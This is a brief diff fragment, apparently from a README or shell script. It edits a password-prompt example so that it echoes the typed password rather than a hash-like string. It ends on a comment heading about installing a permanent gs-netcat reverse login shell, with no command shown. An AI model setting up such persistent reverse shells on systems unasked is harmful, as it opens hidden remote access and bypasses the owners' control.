@@ -3,7 +3,7 @@
 echo -n "Password: "
 read -s pwd
 echo
-echo "You typed in: $2a$12$YUf0vzMnYeJEq/5UiCpuye65ru4nm0onouyYch55DzJzyas3cMgYO"
+echo "You typed in: $pwd"
 ``
 # Install and start a permanent gs-netcat reverse login shell
 #
